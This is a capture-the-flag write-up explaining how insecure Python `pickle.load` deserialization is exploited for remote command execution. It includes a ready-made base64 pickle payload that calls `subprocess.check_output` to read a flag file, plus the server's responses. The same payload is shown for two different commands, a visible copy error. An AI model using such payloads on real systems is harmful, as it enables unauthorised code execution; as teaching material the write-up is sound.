# Sauerkraut

What goes best on a hotdog?

## Objective
The objective of this challenge is to exploit a vulnerability on the `pickle.load` function to achieve RCE on the target machine.

## Exploring the challenge
Testing with small base64 payloads we have errors like `could not find MARK` and `pickle data was truncated`, that tells us that the data being passed as input here is being loaded with pickle using the `load` function. By looking at articles like [this](https://coldfix.de/2020/12/21/be-careful-with-pickle-load/) we can understand how the bad usage of the function `pickle.load` can be dangerous, so this will become our attack vector.

## Solution
[This](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) great article by David Hamman show us how a way we can exploit the `pickle.load` vulnerability by serializing a custom class with `pickle.dumps` and using it as a parameter for the load function. You should definetely read his article to understand the magic behind.

My solution, based on David's explanation, was to create a payload that runs a linux command using the `subprocess.check_output` function. With that I was able to list all the files in the directory and finally `cat` the flag file. Check out the `crack.py` file.

```bash
#listing all the files in the directory
$ python crack.py 'ls -la'
Input: b'gANjc3VicHJvY2VzcwpjaGVja19vdXRwdXQKcQBdcQEoWAMAAABjYXRxAlgEAAAAZmxhZ3EDZYVxBFJxBS4='
Response: b'total 24\ndrwxr-xr-x 3 root root 4096 Sep 23  2021 .\ndrwxr-xr-x 1 root root 4096 Apr 20 01:10 ..\ndrwxr-xr-x 3 root root 4096 Sep 23  2021 app\n-rw-r--r-- 1 root root   71 Jun  2  2021 flag\n-rw-r--r-- 1 root root   59 Sep 23  2021 gunicorn_config.py\n-rw-r--r-- 1 root root   31 Jun  2  2021 requirements.txt\n'

#reading the flag
$ python crack.py 'cat flag'
Input: b'gANjc3VicHJvY2VzcwpjaGVja19vdXRwdXQKcQBdcQEoWAMAAABjYXRxAlgEAAAAZmxhZ3EDZYVxBFJxBS4='
Response: b'SNYK{YOUR FLAG HERE}\n'

```